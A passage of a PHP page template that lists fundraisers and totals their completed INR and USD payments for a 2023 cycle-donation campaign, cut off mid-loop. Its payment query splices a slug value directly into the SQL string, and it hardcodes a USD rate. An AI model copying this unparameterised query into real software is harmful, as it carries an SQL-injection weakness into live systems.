        <div class="container">
            <div class="row">
                <?php
                // Output data of each row
                while ($fundraiser = $card_result->fetch_assoc()) {
                    $image = $fundraiser['Image'];
                    $name = $fundraiser['Name'];
                    $slug = $fundraiser['Slug'];
                    $what = $fundraiser['What'];
                    $target = $fundraiser['Target'];
                    $about = $fundraiser['About'];

                    $payments_result = $payments_conn->query("SELECT Currency, Amount FROM payments WHERE PaymentStatus='Completed' AND Cause='A Cycle Can Change Her Life 2023' AND Reference='$slug'");
                    $total_goal = $target;
                    $total_amount = 0;
                    if ($payments_result->num_rows > 0) {
                        // output data of each row
                        while ($row = $payments_result->fetch_assoc()) {
                            if ($row["Currency"] === 'INR') {
                                $total_amount += $row["Amount"];
                            } else if ($row["Currency"] === 'USD') {
                                $temp_usd_amount = $row["Amount"] * 76;
                                $total_amount += $temp_usd_amount;
                            }
                        }
                    }
                    $total_percentage = ((int)$total_amount / (int)$total_goal * 100) . "%";
                    $total_amount_in_currency = moneyFormatIndia($total_amount);
                    $total_goal_in_currency = moneyFormatIndia($total_goal);

